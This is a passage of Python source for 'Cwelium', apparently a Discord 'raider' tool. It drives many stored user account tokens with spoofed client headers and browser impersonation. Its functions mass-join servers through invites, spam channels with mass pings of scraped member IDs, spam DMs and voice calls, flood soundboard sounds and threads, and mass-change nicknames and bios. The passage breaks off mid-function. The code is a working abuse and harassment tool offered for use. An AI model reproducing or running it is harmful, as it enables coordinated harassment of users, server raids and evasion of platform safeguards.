# Copyright (c) 2024-2026 Cwelium Inc.
# This project is licensed under the Cwelium License, which includes additional
# terms under the GNU Affero General Public License (AGPL) v3.0.
#
# Author: Tips-Discord
# Original Repository: https://github.com/Tips-Discord/Cwelium
#
# Additional Terms can be found at:
# https://github.com/Tips-Discord/Cwelium/blob/main/LICENSE

#from concurrent.futures import ThreadPoolExecutor
import getpass
import sys
from colorama import Fore, init; init(autoreset=True)
from colorist import ColorHex as h
from datetime import datetime
import base64
import ctypes
import os
import random
import re
import requests
import zlib
import socket
import string
import threading
import time
try:
    import curl_cffi
    session = curl_cffi.Session(impersonate="chrome136")
    HAS_CURL_CFFI = True
except Exception as e:
    HAS_CURL_CFFI = False
    print(f"Warning: curl-cffi failed to load ({e}). Falling back to requests.")
    class MockCurlSession(requests.Session):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, **kwargs)
            self.impersonate = None
    session = MockCurlSession()

import uuid
import websocket

try:
    import orjson
    HAS_ORJSON = True
except ImportError:
    HAS_ORJSON = False
    import json as std_json

class JsonWrapper:
    @staticmethod
    def loads(data, **kwargs):
        if HAS_ORJSON:
            return orjson.loads(data)
        return std_json.loads(data)

    @staticmethod
    def load(fp, **kwargs):
        if HAS_ORJSON:
            return orjson.loads(fp.read())
        return std_json.load(fp)

    @staticmethod
    def dumps(data, indent=None, separators=None, sort_keys=False, **kwargs):
        if HAS_ORJSON:
            option = 0
            if indent:
                option |= orjson.OPT_INDENT_2
            if sort_keys:
                option |= orjson.OPT_SORT_KEYS
            option |= orjson.OPT_NON_STR_KEYS 
            return orjson.dumps(data, option=option).decode()
        return std_json.dumps(data, indent=indent, separators=separators, sort_keys=sort_keys)

    @staticmethod
    def dump(data, fp, indent=None, separators=None, sort_keys=False, **kwargs):
        if HAS_ORJSON:
            option = 0
            if indent:
                option |= orjson.OPT_INDENT_2
            if sort_keys:
                option |= orjson.OPT_SORT_KEYS
            payload = orjson.dumps(data, option=option)
            try:
                fp.write(payload)
            except TypeError:
                fp.write(payload.decode())
        else:
            std_json.dump(data, fp, indent=indent, separators=separators, sort_keys=sort_keys)

json = JsonWrapper()


def get_random_str(length):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def wrapper(func):
    def wrapper(*args, **kwargs):
        console.clear()
        console.render_ascii()
        result = func(*args, **kwargs)
        return result
    return wrapper

C = {
    "green": h("#65fb07"),
    "red": h("#Fb0707"),
    "yellow": h("#FFCD00"),
    "magenta": h("#b207f5"),
    "blue": h("#00aaff"),
    "cyan": h("#aaffff"),
    "gray": h("#8a837e"),
    "white": h("#DCDCDC"),
    "pink": h("#c203fc"),
    "light_blue": h("#07f0ec"),
    "brown": h("#8B4513"),
    "black": h("#000000"),
    "aqua": h("#00CED1"),
    "purple": h("#800080"),
    "lime": h("#00FF00"),
    "orange": h("#FFA500"),
    "indigo": h("#4B0082"),
    "violet": h("#EE82EE"),
    "gold": h("#FFD700"),
    "silver": h("#C0C0C0"),
    "teal": h("#008080"),
    "navy": h("#000080"),
    "olive": h("#808000"),
    "maroon": h("#800000"),
    "coral": h("#FF7F50"),
    "salmon": h("#FA8072"),
    "khaki": h("#F0E68C"),
    "orchid": h("#DA70D6"),
    "rose": h("#FF007F")
}

scraped_dir = "/tmp/scraped" if os.environ.get("VERCEL") else "scraped"

class Files:
    @staticmethod
    def write_config():
        try:
            if not os.environ.get("VERCEL") and not os.path.exists("config.json"):
                data = {
                    "Proxies": False,
                    "Theme": "light_blue", 
                }
                with open("config.json", "w") as f:
                    json.dump(data, f, indent=4)
        except Exception as e:
            print(f"Failed to Write Config: {e}")

    @staticmethod
    def write_folders():
        folders = ["data", scraped_dir]
        for folder in folders:
            try:
                if not os.path.exists(folder):
                    os.makedirs(folder, exist_ok=True)
            except Exception as e:
                print(f"Failed to Write Folder {folder}: {e}")

    @staticmethod
    def write_files():
        if os.environ.get("VERCEL"):
            return
        files = ["tokens.txt", "proxies.txt"]
        for file in files:
            try:
                if not os.path.exists(f"data/{file}"):
                    with open(f"data/{file}", "a") as f:
                        f.close()
            except Exception as e:
                print(f"Failed to Write File {file}: {e}")

    @staticmethod
    def run_tasks():
        tasks = [Files.write_config, Files.write_folders, Files.write_files]
        for task in tasks:
            task()

Files.run_tasks()


try:
    with open("config.json") as f:
        Config = json.load(f)
except Exception:
    Config = {"Proxies": False, "Theme": "light_blue"}
    
proxy = Config.get("Proxies", False)
color = Config.get("Theme", "light_blue")
global_raider = None

class Render:
    def __init__(self):
        try:
            self.size = os.get_terminal_size().columns
        except OSError:
            self.size = 80
        self.print_lock = threading.Lock()
        self.theme_name = color if color in C else "light_blue"
        self.theme_hex = C[self.theme_name].hex
        try:
            self.username = getpass.getuser()
        except Exception:
            self.username = os.environ.get("USER") or os.environ.get("LOGNAME") or "vercel"

    def title(self, title):
        try:
            if os.name == 'nt':
                ctypes.windll.kernel32.SetConsoleTitleW(title)
            else:
                sys.stdout.write(f"\x1b]2;{title}\x07")
                sys.stdout.flush()
        except Exception:
            pass

    def clear(self):
        sys.stdout.write("\033[2J\033[H\033[3J")
        sys.stdout.flush()

    def _get_shade(self, x, y, width, height):
        def hex_to_rgb(h_code):
            h_code = h_code.lstrip('#')
            return tuple(int(h_code[i:i+2], 16) for i in (0, 2, 4))
        
        start_rgb = hex_to_rgb(self.theme_hex)
        end_rgb = (int(start_rgb[0] * 0.35), int(start_rgb[1] * 0.35), int(start_rgb[2] * 0.35))
        
        w_idx, h_idx = max(1, width - 1), max(1, height - 1)
        denom = (w_idx**2 + h_idx**2)
        factor = (x * w_idx + y * h_idx) / denom
        factor = max(0, min(1, factor)) 
        
        r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * factor)
        g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * factor)
        b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * factor)
        
        return h(f'#{r:02x}{g:02x}{b:02x}')

    def center_colored(self, text, visible_len):
        try:
           terminal_width = os.get_terminal_size().columns
        except OSError:
           terminal_width = self.size

        padding = max(0, (terminal_width - visible_len) // 2)
        return (" " * padding) + text

    def render_ascii(self):
        pass

    def raider_options(self):
        with open("data/proxies.txt") as f:
            global proxies
            proxies = f.read().splitlines()
        with open("data/tokens.txt", "r") as f:
            global tokens
            tokens = f.read().splitlines()

    def run(self):
        options = [self.render_ascii(), self.raider_options()]
        ([option] for option in options)

    def log(self, text=None, color=None, token=None, log=None):
        response = f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] "
        if text:
            response += f"[{color}{text}{C['white']}] "
        if token:
            response += token
        if log:
            response += f" ({C['gray']}{log}{C['white']})"

        response += f"{Fore.RESET}"

        with self.print_lock:
            print(response)

    def prompt(self, text, ask=None):
        prompted = f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{datetime.now().strftime('%H:%M:%S')}{Fore.RESET}] {C[color]}➜{Fore.RESET}  {Fore.WHITE}{text}{Fore.RESET}"

        if ask:
            prompted += f" {Fore.LIGHTBLACK_EX}({C['green']}y{Fore.RESET}{Fore.LIGHTBLACK_EX}/{C['red']}n{Fore.RESET}{Fore.LIGHTBLACK_EX}){Fore.LIGHTBLACK_EX}:{Fore.RESET} "
        else:
            prompted += f"{C[color]}:{Fore.RESET} "
            
        return prompted

console = Render()
    
class AutoFetchHeaders:
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9219 Chrome/138.0.7204.251 Electron/37.6.0 Safari/537.36"
    client_build_number = 482285
    native_build_number = 73385
    client_version = "1.0.9219"
    browser_version = "37.6.0"
    _fetched = False
    
    @staticmethod
    def fetch():
        try:
            if AutoFetchHeaders._fetched:
                return

            response = requests.get("https://api.sockets.lol/discord/build", timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                
                if "clients" in data and "Discord" in data["clients"]:
                    discord_data = data["clients"]["Discord"]["decoded"]
                    
                    if discord_data.get("release_channel") == "stable":
                        AutoFetchHeaders.user_agent = discord_data["browser_user_agent"]
                        AutoFetchHeaders.client_version = discord_data["client_version"]
                        AutoFetchHeaders.browser_version = discord_data["browser_version"]
                        AutoFetchHeaders.native_build_number = discord_data["native_build_number"]
                        AutoFetchHeaders.client_build_number = discord_data["client_build_number"]
                        AutoFetchHeaders._fetched = True
        except Exception:
            pass

class Utils:
    @staticmethod
    def get_ranges(index, multiplier):
        initial_num = index * multiplier
        return [[initial_num, initial_num + 99], [initial_num + 100, initial_num + 199]]

    @staticmethod
    def parse_member_list_update(data):
        d = data["d"]
        return {
            "online_count": d["online_count"],
            "member_count": d["member_count"],
            "guild_id": d["guild_id"],
            "ops": d["ops"]
        }

class DiscordSocket(websocket.WebSocketApp):
    def __init__(self, token, guild_id, channel_id):
        self.start = time.time()
        self.token = token
        self.guild_id = guild_id
        self.channel_id = channel_id
        
        self.blacklisted_ids = {
            "1100342265303547924", "1190052987477958806", "833007032000446505", 
            "1273658880039190581", "1308012310396407828", "1326906424873193586", 
            "1334512667456442411", "1349869929809186846", "1171574570092871700",
        }

        self.buffer = bytearray()
        self.inflator = zlib.decompressobj()

        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-WebSocket-Extensions": "permessage-deflate; client_max_window_bits",
            "User-Agent": AutoFetchHeaders.user_agent,
        }

        super().__init__(
            "wss://gateway.discord.gg/?encoding=json&v=9&compress=zlib-stream",
            header=headers,
            on_open=self.on_open,
            on_message=self.on_message,
            on_close=self.on_close,
            on_error=self.on_error
        )

        self.end_scraping = False
        self.guild_member_count = 0
        self.members = {}
        self.ranges = [[0, 99]]
        self.last_range = 0
        self.packets_recv = 0

    def run(self):
        self.run_forever(
            sockopt=((socket.IPPROTO_TCP, socket.TCP_NODELAY, 1),)
        )
        return self.members

    def scrape_users(self):
        if self.end_scraping:
            return
            
        payload = {
            "op": 14,
            "d": {
                "guild_id": self.guild_id,
                "typing": False,
                "activities": False,
                "threads": False,
                "channels": {self.channel_id: self.ranges}
            }
        }
        self.send(json.dumps(payload))

    def on_open(self, ws):
        self.send(json.dumps({
            "op": 2,
            "d": {
                "token": self.token,
                "capabilities": 1734653,
                "properties": {
                    "os": "Windows",
                    "browser": "Chrome",
                    "device": "",
                    "system_locale": "en-US",
                    "browser_user_agent": AutoFetchHeaders.user_agent,
                    "browser_version": AutoFetchHeaders.browser_version,
                    "os_version": "10",
                    "referrer": "",
                    "referring_domain": "",
                    "referrer_current": "",
                    "referring_domain_current": "",
                    "release_channel": "stable",
                    "client_build_number": AutoFetchHeaders.client_build_number,
                    "client_event_source": None
                },
                "presence": {
                    "status": "online",
                    "since": 0,
                    "activities": [],
                    "afk": False
                },
                "compress": False,
                "client_state": {
                    "guild_hashes": {},
                    "highest_last_message_id": "0",
                    "read_state_version": 0,
                    "user_guild_settings_version": -1,
                    "user_settings_version": -1
                }
            }
        }))

    def heartbeat_thread(self, interval):
        while not self.end_scraping:
            try:
                self.send(json.dumps({"op": 1, "d": self.packets_recv}))
                time.sleep(interval)
            except Exception:
                break

    def on_message(self, ws, message):
        if isinstance(message, bytes):
            self.buffer.extend(message)
            if len(message) < 4 or message[-4:] != b'\x00\x00\xff\xff':
                return
            
            try:
                message = self.inflator.decompress(self.buffer)
                message = message.decode("utf-8")
                self.buffer = bytearray()
            except Exception:
                return 

        try:
            decoded = json.loads(message)
        except:
            return

        if decoded is None: 
            return

        op = decoded.get("op")
        t = decoded.get("t")
        
        self.packets_recv += 1 if op != 11 else 0

        if op == 10:
            interval = decoded["d"]["heartbeat_interval"] / 1000
            threading.Thread(target=self.heartbeat_thread, args=(interval,), daemon=True).start()

        elif t == "READY":
            for guild in decoded["d"]["guilds"]:
                if guild["id"] == self.guild_id:
                    self.guild_member_count = guild.get("member_count", 0)
                    break
            
            console.log("Info", C["yellow"], False, f"Target: {self.guild_member_count} members")

        elif t == "READY_SUPPLEMENTAL":
            self.ranges = Utils.get_ranges(0, 100)
            self.scrape_users()

        elif t == "GUILD_MEMBER_LIST_UPDATE":
            parsed = Utils.parse_member_list_update(decoded)
            
            if parsed["guild_id"] == self.guild_id:
                should_continue = False
                
                for op_chunk in parsed["ops"]:
                    op_type = op_chunk["op"]
                    
                    if op_type in ("SYNC", "UPDATE"):
                        if op_type == "SYNC":
                            items = op_chunk.get("items")
                        else:
                            items = [op_chunk.get("item")]

                        if not items: 
                            continue

                        for item in items:
                            member = item.get("member")
                            if not member: 
                                continue
                            
                            user = member.get("user")
                            if not user: 
                                continue
                            
                            uid = user.get("id")
                            if uid and uid not in self.blacklisted_ids and not user.get("bot"):
                                self.members[uid] = {
                                    "tag": f"{user.get('username')}#{user.get('discriminator', '0')}",
                                    "id": uid
                                }
                        
                        should_continue = True

                    elif op_type == "INVALIDATE":
                        self.ranges = Utils.get_ranges(self.last_range, 100)
                        self.scrape_users()
                        
                if len(self.members) >= self.guild_member_count or not should_continue:
                    if (self.last_range * 100) >= self.guild_member_count:
                        self.end_scraping = True
                        self.close()
                        return

                self.last_range += 2
                self.ranges = Utils.get_ranges(self.last_range, 100)
                self.scrape_users()

    def on_error(self, ws, error):
        if not self.end_scraping:
            console.log("Error", C["red"], False, f"Socket Error: {error}")
            pass

    def on_close(self, ws, close_code, close_msg):
        console.log("Success", C["green"], False, f"Scraped {len(self.members)} members in {time.time() - self.start:.2f}s")

def scrape(token, guild_id, channel_id):
    sb = DiscordSocket(token, guild_id, channel_id)
    return sb.run()

class Raider:
    def __init__(self):
        AutoFetchHeaders.fetch()
        self.cookies, self.fingerprint = self.get_discord_cookies()
        self.ws = websocket.WebSocket()
        self.cached_members = {}
        self.header_cache = {}

    def get_discord_cookies(self):
        try:
            response = requests.get(
                'https://discord.com/api/v9/experiments',
            )
            match response.status_code:
                case 200:
                    return "; ".join(
                        [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
                    ) + f"; locale=en-US", response.json()["fingerprint"]
                case _:
                    console.log("ERROR", C["red"], "Failed to get cookies using Static")
                    return "__dcfduid=62f9e16000a211ef8089eda5bffbf7f9; __sdcfduid=62f9e16100a211ef8089eda5bffbf7f98e904ba04346eacdf57ee4af97bdd94e4c16f7df1db5132bea9132dd26b21a2a; __cfruid=a2ccd7637937e6a41e6888bdb6e8225cd0a6f8e0-1714045775; _cfuvid=s_CLUzmUvmiXyXPSv91CzlxP00pxRJpqEhuUgJql85Y-1714045775095-0.0.1.1-604800000; locale=en-US"
        except Exception as e:
            console.log("ERROR", C["red"], "get_discord_cookies", e)

    def super_properties(self):
        try:
            payload = {
                "os": "Windows",
                "browser": "Discord Client",
                "release_channel": "stable",
                "client_version": AutoFetchHeaders.client_version,
                "os_version": "10.0.26100",
                "system_locale": "en-US",
                "browser_user_agent": AutoFetchHeaders.user_agent,
                "browser_version": AutoFetchHeaders.browser_version,
                "client_build_number": AutoFetchHeaders.client_build_number,
                "native_build_number": AutoFetchHeaders.native_build_number,
                "client_launch_id": str(uuid.uuid4()), # eg. e6ee9ac7-cbc9-4e22-850f-d78055e4f943
                "client_heartbeat_session_id": str(uuid.uuid4()), # eg. 481a6710-a457-4085-8660-c769355a850b
                "launch_signature": str(uuid.uuid4()), # eg. 860f4e4c-95a1-4355-8b5e-53bee60636b8
                "client_event_source": None,
            }
            properties = base64.b64encode(json.dumps(payload).encode()).decode()
            return properties
        except Exception as e:
            console.log("ERROR", C["red"], "get_super_properties", e)

    def headers(self, token):
        if token in self.header_cache:
            return self.header_cache[token]

        headers = {
            "authority": "discord.com",
            "accept": "*/*",
            "accept-language": "en",
            "authorization": token,
            "cookie": self.cookies,
            "content-type": "application/json",
            "user-agent": AutoFetchHeaders.user_agent,
            "x-discord-locale": "en-US",
            "x-debug-options": "bugReporterEnabled",
            "x-fingerprint": self.fingerprint,
            "x-super-properties": self.super_properties(),
        }

        self.header_cache[token] = headers
        return headers
    
    def nonce(self):
        return int(time.time() * 1000) - 1420070400000 << 22

    def joiner(self, invite):
        try:
            params = {
                "inputValue": f"https://discord.gg/{invite}",
                "with_counts": "true",
                "with_expiration": "true",
                "with_permissions": "true",
            }

            for token in tokens:
                response = session.get(
                    f"https://discord.com/api/v9/invites/{invite}",
                    headers=self.headers(token),
                    params=params
                )

                match response.status_code:
                    case 200:
                        invite_info = response.json()
                        break
                    case 404:
                        console.log("Failed", C["red"], "Invalid or expired invite")
                        input()
                        Menu().main_menu()
                        return
            
            if not invite_info:
                console.log("Failed", C["red"], "Could not retrieve invite info")
                input()
                Menu().main_menu()
                return

            guild_name = invite_info["guild"]["name"]
            guild_id = invite_info["guild"]["id"]
            channel_id = invite_info["channel"]["id"]
            channel_type = invite_info["channel"]["type"]

            join = {
                "location": "Join Guild",
                "location_guild_id": guild_id,
                "location_channel_id": channel_id,
                "location_channel_type": channel_type
            }
            context = base64.b64encode(json.dumps(join).encode()).decode()

            def join_server(token):
                try:
                    headers = self.headers(token)
                    headers["X-Context-Properties"] = context

                    payload = {
                        "session_id": uuid.uuid4().hex
                    }

                    resp = session.post(
                        f"https://discord.com/api/v9/invites/{invite}",
                        headers=headers,
                        json=payload
                    )

                    match resp.status_code:
                        case 200:
                            console.log("Joined", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
                        case 400:
                            console.log("Captcha", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
                        case 429:
                            console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
                        case _:
                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json()["message"])
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token,) for token in tokens
            ]
            Menu().run(join_server, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to get invite info", e)
            input()
            Menu().main_menu()

    def leaver(self, token, guild):
        try:
            def get_guild_name(guild):
                response = session.get(
                    f"https://discord.com/api/v9/guilds/{guild}",
                    headers=self.headers(token)
                )

                match response.status_code:
                    case 200:
                        try:
                            return response.json()["name"]
                        except:
                            return guild
                
            self.guild = get_guild_name(guild)

            payload = {
                "lurking": False,
            }

            response = session.delete(
                f"https://discord.com/api/v9/users/@me/guilds/{guild}",
                json=payload,
                headers=self.headers(token)
            )

            match response.status_code:
                case 204:
                    console.log("Left", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", self.guild)
                case 429:
                    console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def spammer(self, token, channel, message=None, guild=None, massping=None, pings=None, random_str=None, delay=None):
        try:
            if massping and guild:
                self.get_random_members(guild, 1) 

            url = f"https://discord.com/api/v9/channels/{channel}/messages"
            headers = self.headers(token) 

            while True:
                content = message
                if massping:
                    content += f" {self.get_random_members(guild, pings)}"
                if random_str:
                    content += f" | {get_random_str(10)}"

                payload = {
                    "content": content,
                    "nonce": str(self.nonce()),
                    "tts": False
                }

                response = session.post(
                    url,
                    headers=headers,
                    json=payload
                )

                match response.status_code:
                    case 200:
                        console.log("Sent", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                        if delay:
                            time.sleep(delay)
                    case 429:
                        retry_after = response.json()["retry_after"]
                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                        time.sleep(float(retry_after))
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                        return
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def member_scrape(self, guild_id, channel_id):
        try:
            in_guild = []

            if not os.path.exists(f"{scraped_dir}/{guild_id}.json"):
                for token in tokens:
                    response = session.get(
                        f"https://discord.com/api/v9/guilds/{guild_id}",
                        headers=self.headers(token),
                    )

                    match response.status_code:
                        case 200:
                            in_guild.append(token)
                            break

                if not in_guild:
                    console.log("Failed", C["red"], "Missing Access")
                    return
                token = random.choice(in_guild)
                members = scrape(token, guild_id, channel_id)

                with open(f"{scraped_dir}/{guild_id}.json", "w") as f:
                    json.dump(list(members.keys()), f, indent=2)
        except Exception as e:
            console.log("Failed", C["red"], False, e)

    def get_random_members(self, guild_id, count):
        if guild_id not in self.cached_members:
            try:
                file_path = f"{scraped_dir}/{guild_id}.json"
                if os.path.exists(file_path):
                    with open(file_path, "r") as f:
                        self.cached_members[guild_id] = json.loads(f.read())
                else:
                    return ""
            except Exception as e:
                console.log("Error", C["red"], f"Cache Load Failed: {e}")
                return ""


        members = self.cached_members[guild_id]
        if not members: 
            return ""
        
        selected = random.sample(members, min(count, len(members)))
        return " ".join(f"<@!{uid}>" for uid in selected)

    def voice_spammer(self, token, ws, guild_id, channel_id, close=None):
        try:
            self.onliner(token, ws)
            ws.send(
                json.dumps(
                    {
                        "op": 4,
                        "d": {
                            "guild_id": guild_id,
                            "channel_id": channel_id,
                            "self_mute": False,
                            "self_deaf": False,
                            "self_stream": False,
                            "self_video": True,
                        },
                    }
                )
            )

            ws.send(
                json.dumps(
                    {
                        "op": 18,
                        "d": {
                            "type": "guild",
                            "guild_id": guild_id,
                            "channel_id": channel_id,
                            "preferred_region": "singapore",
                        },
                    }
                )
            )
            
            ws.send(json.dumps({"op": 1, "d": None}))
            if close:
                ws.close()
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def vc_joiner(self, token, guild, channel, ws):
        try:
            for _ in range(1):
                ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
                ws.send(json.dumps({
                    "op": 2,
                    "d": {
                        "token": token,
                        "properties": {
                            "os": "windows",
                            "browser": "Discord",
                            "device": "desktop"
                        }
                    }
                }))

                ws.send(json.dumps({
                    "op": 4,
                    "d": {
                        "guild_id": guild,
                        "channel_id": channel,
                        "self_mute": random.choice([True, False]),
                        "self_deaf": False
                    }
                }))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def onliner(self, token, ws):
        try:
            ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
            ws.send(
                json.dumps(
                    {
                        "op": 2,
                        "d": {
                            "token": token,
                            "properties": {
                                "os": "Windows",
                            },
                            "presence": {
                                "game": {
                                    "name": "Cwelium",
                                    "type": 0,
                                },
                                "status": random.choice(['online', 'dnd', 'idle']),
                                "since": 0,
                                "afk": False
                            }
                        },
                    }
                )
            )

            console.log("Onlined", C[color], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def join_voice_channel(self, token, guild_id, channel_id):
        ws = websocket.WebSocket()

        def check_for_guild(token):
            response = session.get(
                f"https://discord.com/api/v9/guilds/{guild_id}", 
                headers=self.headers(token)
            )
            match response.status_code:
                case 200:
                    return True
                case _:
                    return False

        def check_for_channel(token):
            if check_for_guild(token):
                response = session.get(
                    f"https://discord.com/api/v9/channels/{channel_id}", 
                    headers=self.headers(token)
                )

                match response.status_code:
                    case 200:
                        return True
                    case _:
                        return False

        if check_for_channel(token):
            console.log("Joined", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            self.vc_joiner(token, guild_id, channel_id, ws)
        else:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")

    def soundbord(self, token, channel):
        try:
            sounds = session.get(
                "https://discord.com/api/v9/soundboard-default-sounds",
                headers=self.headers(token)
            ).json()

            time.sleep(1)

            while True:
                sound = random.choice(sounds)

                payload = {
                    "emoji_id": None,
                    "emoji_name": sound["emoji_name"],
                    "sound_id": sound["sound_id"],
                }

                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel}/send-soundboard-sound", 
                    headers=self.headers(token), 
                    json=payload,
                )

                match response.status_code:
                    case 204:
                        console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Played {sound['name']}")
                    case 429:
                        retry_after = response.json()["retry_after"]
                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                        time.sleep(float(retry_after))
                    case _:
                        break
                time.sleep(random.uniform(0.56, 0.75))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def open_dm(self, token, user_id):
        try:
            payload = {
                "recipients": [f'{user_id}'],
            }

            response = session.post(
                "https://discord.com/api/v9/users/@me/channels",
                headers=self.headers(token),
                json=payload
            )

            match response.status_code:
                case 200:
                    return response.json()["id"]
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                    return
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def call_spammer(self, token, user_id):
        try:
            while True:
                channel_id = self.open_dm(token, user_id)

                json_data = {
                    'recipients': None,
                }

                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/call",
                    headers=self.headers(token),
                    json=json_data,
                )

                match response.status_code:
                    case 200:
                        console.log("Called", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", user_id)
                        ws = websocket.WebSocket()
                        self.voice_spammer(token, ws, channel_id, channel_id, True)
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                        return
                time.sleep(5)
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def dm_spammer(self, token, user_id, message):
        try:
            channel_id = self.open_dm(token, user_id)

            while True:
                payload = {
                    "content": message,
                    "nonce": str(self.nonce()),
                }

                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=self.headers(token),
                    json=payload
                )

                match response.status_code:
                    case 200:
                        console.log("Send", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", user_id)
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))  
                        break
                time.sleep(7)
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def format_tokens(self):
        try:
            formatted = []

            for token in tokens:
                token = token.strip()

                if token:
                    tokens_split = token.split(":")
                    if len(tokens_split) >= 3:
                        formatted_token = tokens_split[2]
                        formatted.append(formatted_token)
                    else:
                        formatted.append(token)

            console.log("Success", C["green"], f"Formatted {len(formatted)} tokens")

            with open("data/tokens.txt", "w") as f:
                for token in formatted:
                    f.write(f"{token}\n")

            Menu().main_menu()
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def bio_changer(self, token, bio):
        try:
            payload = {
                "bio": bio
            }

            response = session.patch(
                "https://discord.com/api/v9/users/@me/profile",
                headers=self.headers(token),
                json=payload
            )

            match response.status_code:
                case 200:
                    console.log("Changed", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", bio)
                case 429:
                    console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def mass_nick(self, token, guild, nick):
        try:
            payload = {
                "nick" : nick
            }

            response = session.patch(
                f"https://discord.com/api/v9/guilds/{guild}/members/@me", 
                headers=self.headers(token),
                json=payload
            )

            match response.status_code:
                case 200:
                    console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def thread_spammer(self, token, channel_id, name):
        try:
            payload = {
                "name": name,
                "type": 11,
                "auto_archive_duration": 4320,
                "location": "Thread Browser Toolbar",
            }

            while True:
                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/threads",
                    headers=self.headers(token),
                    json=payload
                )

                match response.status_code:
                    case 201:
                        console.log("Created", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", name)
                    case 429:
                        retry_after = response.json()["retry_after"]
                        if int(retry_after) > 10:
